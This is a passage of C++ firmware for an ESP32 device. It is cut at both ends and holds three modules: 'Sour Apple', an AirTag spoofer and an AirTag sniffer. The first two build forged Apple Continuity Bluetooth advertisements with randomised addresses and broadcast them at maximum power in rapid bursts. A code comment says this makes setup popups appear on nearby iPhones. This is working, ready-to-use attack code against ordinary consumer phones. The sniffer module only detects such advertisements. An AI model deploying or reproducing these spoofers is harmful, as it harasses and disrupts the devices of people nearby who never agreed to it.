    s_addrIsRandom = true;
  }
  newRandomStaticAddress();
  buildSourPacket();

  // Raw payload only: setFlags(), addServiceUUID() and addTxPower() each
  // prepend their own AD structure and would corrupt the exact Apple frame.
  BLEAdvertisementData advData;
  advData.addData(std::string(reinterpret_cast<char*>(s_packet), s_packetLen));
  s_advertising->setAdvertisementData(advData);

  if (!s_advConfigured) {
    // ADV_IND: the continuity action is only parsed from connectable
    // undirected advertising.
    s_advertising->setAdvertisementType(BLE_GAP_CONN_MODE_UND);
    s_advertising->setMinInterval(0x20);
    s_advertising->setMaxInterval(0x20);
    s_advertising->setMinPreferred(0x20);
    s_advertising->setMaxPreferred(0x20);
    s_advConfigured = true;
  }

  if (s_advertising->start()) {
    s_txCount++;
    // Rate-limited radio diagnostic, same convention as BleSpoofer: proves
    // the exact frame did leave the controller and from which address.
    if ((uint32_t)(millis() - s_lastSerialMs) >= kSerialMs) {
      s_lastSerialMs = millis();
      const char* frameName = (kVariants[s_variantIndex].builder == bAuto)
                                ? s_activeFamilyName
                                : kVariants[s_variantIndex].name;
      char idStr[8];
      if (s_activeCode > 0xFF) {
        snprintf(idStr, sizeof(idStr), "0x%04X", (unsigned)s_activeCode);
      } else {
        snprintf(idStr, sizeof(idStr), "0x%02X", (unsigned)s_activeCode);
      }
      Serial.printf("[sourapple] #%lu %s MAC=%02X:%02X:%02X:%02X:%02X:%02X id=%s len=%u start=1 payload=",
                    (unsigned long)s_txCount, frameName,
                    s_mac[5], s_mac[4], s_mac[3], s_mac[2], s_mac[1], s_mac[0],
                    idStr, (unsigned)s_packetLen);
      for (size_t b = 0; b < s_packetLen; b++) {
        Serial.printf("%02X", s_packet[b]);
      }
      Serial.println();
    }
  } else if ((uint32_t)(millis() - s_lastLogMs) >= kLogMs) {
    s_lastLogMs = millis();
    logLine("[!] Radio refused start", UI_WARN);
    Serial.println("[sourapple] start=0 (radio refused)");
  }
}

static void startAdvertising() {
  if (!ensureAdvertising()) {
    logLine("[!] BLE unavailable", UI_WARN);
    return;
  }

  s_running = true;
  s_txCount = 0;
  s_lastFieldMs = 0;
  s_advConfigured = false;
  updateInfoFields(true);
  updateNavLabels();
  logLine("[+] Sour Apple live", ORANGE);

  rotateAdvertising();
  updateInfoFields(true);
}

static void stopAdvertising() {
  stopRadio();
  s_running = false;
  updateInfoFields(true);
  updateNavLabels();
  logLine("[*] Stopped", UI_DIM_TEXT);
}

// Pick the next/previous frame variant. The change lands on the next rotation,
// so a running attack switches frame within a second.
static void selectVariant(int delta) {
  const int n = (int)kVariantCount;
  s_variantIndex = (uint8_t)(((int)s_variantIndex + delta + n) % n);
  if (kVariants[s_variantIndex].builder == bAuto) {
    // Restart the sweep from the top of the interleaved pool.
    s_autoItem = 0;
  }
  buildSourPacket();
  updateInfoFields(true);

  char line[40];
  snprintf(line, sizeof(line), "[*] Frame -> %s", kVariants[s_variantIndex].name);
  logLine(line, ORANGE);
}

// Pick the next hold time. The change starts counting from now, so a running
// attack reports the new rate within one rotation either way.
static void selectRate(int delta) {
  const int n = (int)kRateCount;
  s_rateIndex = (uint8_t)(((int)s_rateIndex + delta + n) % n);
  s_lastRotateMs = millis();
  updateInfoFields(true);

  const uint16_t pool = currentPoolSize();
  const unsigned long rateS = (unsigned long)kRatesMs[s_rateIndex] / 1000UL;
  char line[40];
  snprintf(line, sizeof(line), "[*] Rate %lus, cycle %lus", rateS,
           rateS * (unsigned long)(pool ? pool : 1));
  logLine(line, ORANGE);
}

static void handleButtons() {
  const unsigned long now = millis();
  if (now - s_lastBtnMs < kBtnDebounceMs) {
    // Keep the edge detector current during the lockout so a quick second
    // press is still counted once, not twice.
    (void)isButtonPressedEdge(BTN_SELECT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    (void)isButtonPressedEdge(BTN_RIGHT);
    return;
  }

  // SELECT is Start/Stop. LEFT is the universal Exit and is handled as a
  // level check at the top of sourappleLoop(). UP/DOWN walk the frame
  // variants and RIGHT cycles the hold time, so each setting can be judged on
  // the phone on its own.
  if (isButtonPressedEdge(BTN_SELECT)) {
    s_lastBtnMs = now;
    if (s_running) {
      stopAdvertising();
    } else {
      startAdvertising();
    }
    return;
  }

  if (isButtonPressedEdge(BTN_DOWN)) {
    s_lastBtnMs = now;
    selectVariant(1);
    return;
  }

  if (isButtonPressedEdge(BTN_UP)) {
    s_lastBtnMs = now;
    selectVariant(-1);
    return;
  }

  if (isButtonPressedEdge(BTN_RIGHT)) {
    s_lastBtnMs = now;
    selectRate(1);
    return;
  }
}

static void teardown() {
  stopRadio();
  s_running = false;
  s_advConfigured = false;
}

void sourappleSetup() {
  if (!bleRequireStackOrExit()) return;
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleClearBody(TFT_BLACK);
  setupTouchscreen();

  s_uiDrawn = false;
  s_staticDrawn = false;
  s_running = false;
  s_advConfigured = false;
  s_addrIsRandom = false;
  s_txCount = 0;
  s_variantIndex = 0;
  s_activeBuilder = bAudioTag;
  s_activeCode = 0;
  s_activeName = "AirTag";
  s_activeFamilyName = "aud tag";
  s_autoItem = 0;
  s_rateIndex = kDefaultRateIndex;
  s_logCount = 0;
  s_lastBtnMs = 0;
  s_lastRotateMs = 0;
  s_lastFieldMs = 0;
  s_lastLogMs = 0;
  s_lastSerialMs = 0;
  s_cacheState[0] = '\0';
  s_cacheMac[0] = '\0';
  s_cacheFrame[0] = '\0';
  s_cacheAction[0] = '\0';
  s_cacheRate[0] = '\0';
  s_cacheTx[0] = '\0';
  memset(s_log, 0, sizeof(s_log));
  memset(s_dispLog, 0, sizeof(s_dispLog));
  memset(s_dispColor, 0, sizeof(s_dispColor));
  memset(s_mac, 0, sizeof(s_mac));

  randomSeed(esp_random());
  buildSourPacket();

  // Never inherit a running radio from a previous visit.
  ensureAdvertising();
  stopRadio();

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();
  runUI();
  updateNavLabels();

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

  updateInfoFields(true);
  logLine("[*] Ready - Select = Start", ORANGE);
  logLine("[*] Auto: all models in turn", UI_DIM_TEXT);
  logLine("[*] Right = rate, close prompts", UI_DIM_TEXT);
}

void sourappleLoop() {
  if (feature_exit_requested) {
    teardown();
    return;
  }

  // LEFT is the universal Exit. Tested as a level (not an edge) and first
  // thing on every pass, so a single press is caught within a few
  // milliseconds: this loop never blocks on the radio nor on a repaint.
  if (feature_active && isButtonPressed(BTN_LEFT)) {
    teardown();
    feature_exit_requested = true;
    return;
  }

  handleButtons();
  runUI();
  updateStatusBar();
  maintainTouchNavBar();

  if (s_running) {
    const unsigned long now = millis();
    if (s_lastRotateMs == 0 ||
        (uint32_t)(now - s_lastRotateMs) >= (uint32_t)kRatesMs[s_rateIndex]) {
      rotateAdvertising();
    }
    if ((uint32_t)(now - s_lastFieldMs) >= kFieldMs) {
      s_lastFieldMs = now;
      updateInfoFields(false);
    }
  }

  if (feature_exit_requested) {
    teardown();
  }
}

void exit() {
  teardown();
}
}

namespace AirTagSpoofer {

#define SCREEN_WIDTH 240
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 1

static constexpr int INFO_Y = 42;
static constexpr int ROW_H = 16;
static constexpr int COL_LABEL_X = 10;
static constexpr int COL_VALUE_X = 58;
static constexpr int COL_VALUE_W = 120;
static constexpr int COL_RIGHT_MARGIN = 10;
static constexpr int FIELD_H = 10;
static constexpr int LOG_HDR_Y = 118;
static constexpr int LOG_Y = 134;
static constexpr int LINE_H = 12;
static constexpr int MAX_LOG = 16;
static constexpr unsigned long BTN_DEBOUNCE_MS = 220;
static constexpr unsigned long BURST_INTERVAL_MS = 120;
static constexpr unsigned long UI_FIELD_MS = 500;
static constexpr unsigned long LOG_INTERVAL_MS = 1200;
static constexpr int LOG_LINE_LEN = 40;

// Apple Continuity Proximity Pairing â€” AirTag models (Flipper / Xtreme).
// Prefix 0x05 = "New AirTag" (triggers setup popup on nearby iPhones).
static const uint16_t kAirTagModels[] = {0x0055, 0x0030};
static constexpr int kAirTagModelCount = 2;

static int iconX[ICON_NUM] = {10};
static int iconY = STATUS_BAR_Y_OFFSET;
static bool s_uiDrawn = false;
static bool s_staticDrawn = false;
static bool s_running = false;
static bool s_advConfigured = false;
static unsigned long s_lastBtnMs = 0;
static unsigned long s_lastBurstMs = 0;
static unsigned long s_lastFieldMs = 0;
static unsigned long s_lastLogMs = 0;
static uint32_t s_txCount = 0;
static int s_modelIndex = 0;

static uint8_t s_mac[6];
static uint8_t s_packet[31];

static BLEAdvertising* s_advertising = nullptr;
static const char* s_advUuid = "00003082-0000-1000-9000-00805f9b34fb";

static char s_log[MAX_LOG][LOG_LINE_LEN];
static uint16_t s_logColor[MAX_LOG];
static int s_logCount = 0;
static char s_dispLog[MAX_LOG][LOG_LINE_LEN];
static uint16_t s_dispColor[MAX_LOG];
static int s_dispCount = 0;

static char s_cacheModel[16] = {0};
static char s_cacheMac[24] = {0};
static char s_cacheTx[16] = {0};
static char s_cacheHint[40] = {0};

static int rowY(int row) {
  return INFO_Y + 4 + row * ROW_H;
}

static int logBottomY() {
  // Leave a 2px gap above the touch nav bar.
  return bleContentBottom() - 2;
}

static int logVisibleLines() {
  const int h = logBottomY() - LOG_Y;
  if (h < LINE_H) {
    return 1;
  }
  int n = h / LINE_H;
  if (n > MAX_LOG) {
    n = MAX_LOG;
  }
  return n;
}

static void updateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  // Remapped layout: LEFT=Exit (was Start/Stop), SELECT=Start/Stop (the most
  // important action, was Exit). DOWN=Model, unchanged.
  setTouchNavLabels("Exit",
                    "Model",
                    s_running ? "Stop" : "Start",
                    nullptr,
                    nullptr);
  redrawTouchButtonBar();
}

static const char* modelName(int idx) {
  switch (kAirTagModels[idx % kAirTagModelCount]) {
    case 0x0055: return "AirTag";
    case 0x0030: return "AirTag Alt";
    default: return "AirTag";
  }
}

static void buildProximityPacket() {
  const uint16_t model = kAirTagModels[s_modelIndex % kAirTagModelCount];
  int i = 0;
  s_packet[i++] = 0x1e;
  s_packet[i++] = 0xff;
  s_packet[i++] = 0x4c;
  s_packet[i++] = 0x00;
  s_packet[i++] = 0x07;
  s_packet[i++] = 0x19;
  s_packet[i++] = 0x05;
  s_packet[i++] = (uint8_t)((model >> 8) & 0xFF);
  s_packet[i++] = (uint8_t)(model & 0xFF);
  s_packet[i++] = 0x55;
  s_packet[i++] = (uint8_t)(((random(10)) << 4) | (random(10)));
  s_packet[i++] = (uint8_t)(((random(8)) << 4) | (random(10)));
  s_packet[i++] = (uint8_t)random(256);
  s_packet[i++] = 0x00;
  s_packet[i++] = 0x00;
  esp_fill_random(&s_packet[i], 16);
  i += 16;
  while (i < 31) {
    s_packet[i++] = 0x00;
  }

  for (int b = 0; b < 6; b++) {
    s_mac[b] = (uint8_t)random(256);
  }
  s_mac[0] |= 0xC0;
}

static void paintField(int x, int y, int w, char* cache, size_t cacheSz,
                       const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }

  tft.setTextSize(1);
  int clearW = w;
  if (cache && cache[0]) {
    const int oldW = tft.textWidth(cache) + 2;
    const int newW = text[0] ? (tft.textWidth(text) + 2) : 0;
    clearW = oldW > newW ? oldW : newW;
    if (clearW > w) {
      clearW = w;
    }
  }
  tft.fillRect(x, y, clearW, FIELD_H, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(x, y);
  tft.print(text);

  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void paintFieldRight(int y, int rightMargin, char* cache, size_t cacheSz,
                            const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }

  tft.setTextSize(1);
  const int newW = text[0] ? tft.textWidth(text) : 0;
  const int oldW = (cache && cache[0]) ? tft.textWidth(cache) : 0;
  const int useW = oldW > newW ? oldW : newW;
  const int clearW = useW + 2;
  tft.fillRect(SCREEN_WIDTH - rightMargin - clearW, y, clearW, FIELD_H, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(SCREEN_WIDTH - rightMargin - newW, y);
  tft.print(text);
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void drawStaticChrome() {
  if (s_staticDrawn) {
    return;
  }
  s_staticDrawn = true;

  tft.setTextSize(1);
  tft.setTextColor(ORANGE, TFT_BLACK);
  tft.setCursor(COL_LABEL_X, rowY(0));
  tft.print("MODEL");
  tft.setCursor(COL_LABEL_X, rowY(1));
  tft.print("MAC");
  tft.setCursor(COL_LABEL_X, rowY(2));
  tft.print("PROTO");

  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setCursor(COL_VALUE_X, rowY(2));
  tft.print("Continuity 0x07");

  tft.fillRect(0, LOG_HDR_Y, SCREEN_WIDTH, LOG_Y - LOG_HDR_Y, TFT_BLACK);
  tft.setTextColor(ORANGE, TFT_BLACK);
  tft.setCursor(COL_LABEL_X, LOG_HDR_Y + 2);
  tft.print("ACTIVITY");
  const int ruleX = COL_LABEL_X + tft.textWidth("ACTIVITY") + 8;
  tft.drawFastHLine(ruleX, LOG_HDR_Y + 6, SCREEN_WIDTH - COL_RIGHT_MARGIN - ruleX, UI_LINE);
}

static void updateInfoFields(bool force) {
  drawStaticChrome();

  if (force) {
    s_cacheModel[0] = '\0';
    s_cacheMac[0] = '\0';
    s_cacheTx[0] = '\0';
    s_cacheHint[0] = '\0';
  }

  char mac[24];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           s_mac[0], s_mac[1], s_mac[2], s_mac[3], s_mac[4], s_mac[5]);
  char tx[16];
  snprintf(tx, sizeof(tx), "TX %lu", (unsigned long)s_txCount);
  const char* hint = s_running ? "Unlock iPhone, stay nearby" : "Press Start to begin";

  paintField(COL_VALUE_X, rowY(0), COL_VALUE_W, s_cacheModel, sizeof(s_cacheModel),
             modelName(s_modelIndex), WHITE);
  paintFieldRight(rowY(0), COL_RIGHT_MARGIN, s_cacheTx, sizeof(s_cacheTx), tx, UI_DIM_TEXT);
  paintField(COL_VALUE_X, rowY(1), COL_VALUE_W + 40, s_cacheMac, sizeof(s_cacheMac), mac, WHITE);
  paintField(COL_LABEL_X, rowY(3), SCREEN_WIDTH - 20, s_cacheHint, sizeof(s_cacheHint),
             hint, UI_DIM_TEXT);
}

static void paintLogSlot(int index, const char* text, uint16_t color) {
  const int cap = logVisibleLines();
  const int bottom = logBottomY();
  if (index < 0 || index >= cap) {
    return;
  }
  if (!text) {
    text = "";
  }

  const int y = LOG_Y + index * LINE_H;
  if (y + LINE_H > bottom) {
    return;
  }

  // Only repaint when the on-screen slot actually changes.
  if (strcmp(s_dispLog[index], text) == 0 && s_dispColor[index] == color) {
    return;
  }

  tft.setTextSize(1);
  tft.fillRect(0, y, SCREEN_WIDTH, LINE_H, TFT_BLACK);
  if (text[0]) {
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(COL_LABEL_X, y);
    tft.print(text);
  }

  strncpy(s_dispLog[index], text, LOG_LINE_LEN - 1);
  s_dispLog[index][LOG_LINE_LEN - 1] = '\0';
  s_dispColor[index] = color;
}

static void syncLogDisplay() {
  const int cap = logVisibleLines();
  for (int i = 0; i < cap; i++) {
    if (i < s_logCount) {
      paintLogSlot(i, s_log[i], s_logColor[i]);
    } else if (s_dispLog[i][0]) {
      paintLogSlot(i, "", TFT_BLACK);
    }
  }
  s_dispCount = s_logCount;
}

static void logLine(const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  const int cap = logVisibleLines();
  const bool scrolled = (s_logCount >= cap);

  if (scrolled) {
    for (int i = 0; i < cap - 1; i++) {
      memcpy(s_log[i], s_log[i + 1], LOG_LINE_LEN);
      s_logColor[i] = s_logColor[i + 1];
    }
    s_logCount = cap - 1;
  }

  strncpy(s_log[s_logCount], text, LOG_LINE_LEN - 1);
  s_log[s_logCount][LOG_LINE_LEN - 1] = '\0';
  s_logColor[s_logCount] = color;
  const int lineIdx = s_logCount;
  s_logCount++;

  if (scrolled) {
    // Shifted lines: update each dirty slot only (no full-zone wipe).
    syncLogDisplay();
    return;
  }

  paintLogSlot(lineIdx, s_log[lineIdx], color);
  s_dispCount = s_logCount;
}

static void ensureAdvertising() {
  if (!s_advertising) {
    ensureBleStackReady();
    BLEServer* server = BLEDevice::createServer();
    s_advertising = server->getAdvertising();
    s_advConfigured = false;
  }
}

static void burstOnce(bool forceLog) {
  ensureAdvertising();
  buildProximityPacket();

  BLEAdvertisementData advData;
  advData.addData(std::string(reinterpret_cast<char*>(s_packet), 31));

  // Match Sour Apple: update payload + start, do not stop/restart each burst
  // (repeated stop/start + addServiceUUID was resetting the ESP32).
  if (!s_advConfigured) {
    s_advertising->addServiceUUID(s_advUuid);
    s_advertising->setMinInterval(0x20);
    s_advertising->setMaxInterval(0x20);
    s_advertising->setMinPreferred(0x20);
    s_advertising->setMaxPreferred(0x20);
    s_advConfigured = true;
  }
  s_advertising->setAdvertisementData(advData);
  s_advertising->start();

  s_txCount++;
  s_lastBurstMs = millis();

  const unsigned long now = millis();
  if (now - s_lastFieldMs >= UI_FIELD_MS) {
    s_lastFieldMs = now;
    updateInfoFields(false);
  }

  if (forceLog || (now - s_lastLogMs >= LOG_INTERVAL_MS)) {
    s_lastLogMs = now;
    char line[LOG_LINE_LEN];
    snprintf(line, sizeof(line), "[+] %s  %02X:%02X:%02X  #%lu",
             modelName(s_modelIndex), s_mac[0], s_mac[1], s_mac[2],
             (unsigned long)s_txCount);
    logLine(line, ORANGE);
  }
}

static void stopAdvertising() {
  if (s_advertising) {
    s_advertising->stop();
  }
  s_running = false;
  updateInfoFields(true);
  updateNavLabels();
  logLine("[*] Stopped", UI_DIM_TEXT);
}

static void startAdvertising() {
  ensureAdvertising();
  s_running = true;
  s_lastFieldMs = 0;
  s_lastLogMs = 0;
  updateInfoFields(true);
  updateNavLabels();
  logLine("[+] AirTag Continuity live", ORANGE);
  burstOnce(true);
}

static void runUI() {
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_go_back};

  if (!s_uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, ORANGE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    s_uiDrawn = true;
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            feature_exit_requested = true;
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

static void handleButtons() {
  const unsigned long now = millis();
  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_SELECT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    return;
  }

  // Remapped layout: SELECT is now Start/Stop (the most important action,
  // was LEFT). LEFT is the universal Exit, handled as a level check in
  // airTagLoop().
  if (isButtonPressedEdge(BTN_SELECT)) {
    if (s_running) {
      stopAdvertising();
    } else {
      startAdvertising();
    }
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_DOWN)) {
    s_modelIndex = (s_modelIndex + 1) % kAirTagModelCount;
    updateInfoFields(true);
    updateNavLabels();
    char line[36];
    snprintf(line, sizeof(line), "[*] Model -> %s", modelName(s_modelIndex));
    logLine(line, ORANGE);
    s_lastBtnMs = now;
    return;
  }
}

static void teardown() {
  if (s_advertising) {
    s_advertising->stop();
  }
  s_running = false;
  s_advConfigured = false;
  s_advertising = nullptr;
}

void airTagSetup() {
  if (!bleRequireStackOrExit()) return;
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleClearBody(TFT_BLACK);

  setupTouchscreen();
  s_uiDrawn = false;
  s_staticDrawn = false;
  s_running = false;
  s_advConfigured = false;
  s_txCount = 0;
  s_logCount = 0;
  s_dispCount = 0;
  s_advertising = nullptr;
  s_lastBtnMs = 0;
  s_lastBurstMs = 0;
  s_lastFieldMs = 0;
  s_lastLogMs = 0;
  s_modelIndex = 0;
  s_cacheModel[0] = '\0';
  s_cacheMac[0] = '\0';
  s_cacheTx[0] = '\0';
  s_cacheHint[0] = '\0';
  memset(s_log, 0, sizeof(s_log));
  memset(s_dispLog, 0, sizeof(s_dispLog));
  memset(s_dispColor, 0, sizeof(s_dispColor));

  randomSeed(esp_random());
  buildProximityPacket();

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();
  runUI();
  updateNavLabels();

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

  updateInfoFields(true);
  logLine("[*] Ready", ORANGE);
  logLine("[*] Unlock iPhone, then Start", UI_DIM_TEXT);
}

void airTagLoop() {
  if (feature_exit_requested) {
    teardown();
    return;
  }
  // Remapped layout: LEFT exits now (was SELECT).
  if (feature_active && isButtonPressed(BTN_LEFT)) {
    teardown();
    feature_exit_requested = true;
    return;
  }

  handleButtons();
  runUI();
  updateStatusBar();
  maintainTouchNavBar();

  if (s_running) {
    const unsigned long now = millis();
    if (now - s_lastBurstMs >= BURST_INTERVAL_MS) {
      burstOnce(false);
    }
  }

  if (feature_exit_requested) {
    teardown();
  }
}

void exit() {
  teardown();
}

}  // namespace AirTagSpoofer


namespace AirTagSniffer {

#define SCREEN_WIDTH 240
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 1

static constexpr int HDR_Y = 42;
static constexpr int COL_Y = 58;
static constexpr int LIST_Y = 74;
static constexpr int ROW_H = 18;
static constexpr int MAX_HITS = 32;
static constexpr unsigned long BTN_DEBOUNCE_MS = 220;
static constexpr unsigned long UI_MS = 250;
static constexpr int LINE_LEN = 36;

enum HitKind : uint8_t {
  HIT_FIND_MY = 0,  // Apple Offline Finding 0x12
  HIT_NEW_AT = 1,   // Continuity 0x07 prefix 0x05 (New AirTag)
};

struct Hit {
  uint8_t mac[6];
  int8_t rssi;
  uint8_t kind;
  uint8_t status;
  uint16_t hits;
  uint32_t lastSeen;
  bool dirty;
};

static int iconX[ICON_NUM] = {10};
static int iconY = STATUS_BAR_Y_OFFSET;
static bool s_uiDrawn = false;
static bool s_chromeDrawn = false;
static bool s_scanning = false;
static bool s_listDirty = true;
static unsigned long s_lastBtnMs = 0;
static unsigned long s_lastUiMs = 0;

static Hit s_hits[MAX_HITS];
static int s_hitCount = 0;
static int s_selected = 0;
static int s_page = 0;

static BLEScan* s_scan = nullptr;
static portMUX_TYPE s_mux = portMUX_INITIALIZER_UNLOCKED;
static volatile bool s_hasUpdates = false;

static char s_cacheFound[12] = {0};
static char s_cacheState[10] = {0};

static int listBottomY() {
  return bleContentBottom() - 2;
}

static int rowsPerPage() {
  const int h = listBottomY() - LIST_Y;
  if (h < ROW_H) {
    return 1;
  }
  return h / ROW_H;
}

static const char* kindLabel(uint8_t kind) {
  switch (kind) {
    case HIT_FIND_MY: return "FindMy";
    case HIT_NEW_AT:  return "NewAT";
    default:          return "Apple";
  }
}

static void updateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  // Remapped layout: LEFT=Exit (was Start/Stop), SELECT=Start/Stop (the most
  // important action, was Exit). Next moves to DOWN (was RIGHT; Prev/Next
  // always sit on UP/DOWN), Prev stays UP, Clear moves to RIGHT (was DOWN).
  setTouchNavLabels("Exit",
                    "Next",
                    s_scanning ? "Stop" : "Start",
                    "Prev",
                    "Clear");
  redrawTouchButtonBar();
}

static void paintField(int x, int y, int w, char* cache, size_t cacheSz,
                       const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }
  tft.setTextSize(1);
  int clearW = w;
  if (cache && cache[0]) {
    const int oldW = tft.textWidth(cache) + 2;
    const int newW = text[0] ? (tft.textWidth(text) + 2) : 0;
    clearW = oldW > newW ? oldW : newW;
    if (clearW > w) {
      clearW = w;
    }
  }
  tft.fillRect(x, y, clearW, 10, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(x, y);
  tft.print(text);
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void drawChrome() {
  if (s_chromeDrawn) {
    return;
  }
  s_chromeDrawn = true;

  tft.setTextSize(1);
  tft.setTextColor(ORANGE, TFT_BLACK);
  tft.setCursor(10, COL_Y);
  tft.print("TYPE");
  tft.setCursor(58, COL_Y);
  tft.print("MAC");
  tft.setCursor(200, COL_Y);
  tft.print("RSSI");
  tft.drawFastHLine(10, COL_Y + 12, SCREEN_WIDTH - 20, UI_LINE);
}

static void updateHeader(bool force) {
  drawChrome();
  if (force) {
    s_cacheFound[0] = '\0';
    s_cacheState[0] = '\0';
  }
  char found[12];
  snprintf(found, sizeof(found), "FOUND %d", s_hitCount);
  paintField(10, HDR_Y, 90, s_cacheFound, sizeof(s_cacheFound), found, WHITE);
  paintField(200, HDR_Y, 40, s_cacheState, sizeof(s_cacheState),
             s_scanning ? "LIVE" : "IDLE",
             s_scanning ? ORANGE : UI_DIM_TEXT);
}

static void formatRow(const Hit& h, char* out, size_t outSz) {
  snprintf(out, outSz, "%-6s %02X:%02X:%02X:%02X:%02X:%02X %4d",
           kindLabel(h.kind),
           h.mac[0], h.mac[1], h.mac[2], h.mac[3], h.mac[4], h.mac[5],
           (int)h.rssi);
}

static void paintRow(int listIndex, bool selected) {
  const int per = rowsPerPage();
  if (listIndex < 0 || listIndex >= per) {
    return;
  }
  const int absIndex = s_page * per + listIndex;
  const int y = LIST_Y + listIndex * ROW_H;
  if (y + ROW_H > listBottomY()) {
    return;
  }

  tft.fillRect(0, y, SCREEN_WIDTH, ROW_H, TFT_BLACK);

  if (absIndex >= s_hitCount) {
    return;
  }

  char line[LINE_LEN];
  formatRow(s_hits[absIndex], line, sizeof(line));

  const uint16_t color = selected ? ORANGE : WHITE;
  tft.setTextSize(1);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(10, y + 4);
  tft.print(line);
  if (selected) {
    tft.fillRect(2, y + 2, 3, ROW_H - 4, ORANGE);
  }
}

static void redrawList() {
  const int per = rowsPerPage();
  const int start = s_page * per;

  if (s_hitCount <= 0) {
    const int h = listBottomY() - LIST_Y;
    if (h > 0) {
      tft.fillRect(0, LIST_Y, SCREEN_WIDTH, h, TFT_BLACK);
    }
    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.setCursor(10, LIST_Y + 8);
    tft.print(s_scanning ? "Listening for AirTags..." : "Press Start to scan");
    s_listDirty = false;
    return;
  }

  for (int i = 0; i < per; i++) {
    const int absIndex = start + i;
    paintRow(i, absIndex == s_selected);
  }
  s_listDirty = false;
  for (int i = 0; i < s_hitCount; i++) {
    s_hits[i].dirty = false;
  }
}

static void refreshDirtyRows() {
  const int per = rowsPerPage();
  const int start = s_page * per;
  const int end = start + per;
  bool any = s_listDirty;
  for (int i = start; i < end && i < s_hitCount; i++) {
    if (s_hits[i].dirty) {
      any = true;
      break;
    }
  }
  if (!any) {
    return;
  }
  for (int i = 0; i < per; i++) {
    const int absIndex = start + i;
    if (absIndex < s_hitCount && (s_listDirty || s_hits[absIndex].dirty)) {
      paintRow(i, absIndex == s_selected);
      if (absIndex < s_hitCount) {
        s_hits[absIndex].dirty = false;
      }
    } else if (s_listDirty && absIndex >= s_hitCount) {
      paintRow(i, false);
    }
  }
  s_listDirty = false;
}

static int findHitIndex(const uint8_t mac[6]) {
  for (int i = 0; i < s_hitCount; i++) {
    if (memcmp(s_hits[i].mac, mac, 6) == 0) {
      return i;
    }
  }
  return -1;
}

static void upsertHit(const uint8_t mac[6], int8_t rssi, uint8_t kind, uint8_t status) {
  const int idx = findHitIndex(mac);
  if (idx >= 0) {
    Hit& h = s_hits[idx];
    if (h.rssi != rssi || h.status != status || h.kind != kind) {
      h.dirty = true;
    }
    h.rssi = rssi;
    h.kind = kind;
    h.status = status;
    h.hits++;
    h.lastSeen = millis();
    return;
  }
  if (s_hitCount >= MAX_HITS) {
    // Drop weakest RSSI to make room.
    int weakest = 0;
    for (int i = 1; i < s_hitCount; i++) {
      if (s_hits[i].rssi < s_hits[weakest].rssi) {
        weakest = i;
      }
    }
    if (rssi < s_hits[weakest].rssi) {
      return;
    }
    memmove(&s_hits[weakest], &s_hits[weakest + 1],
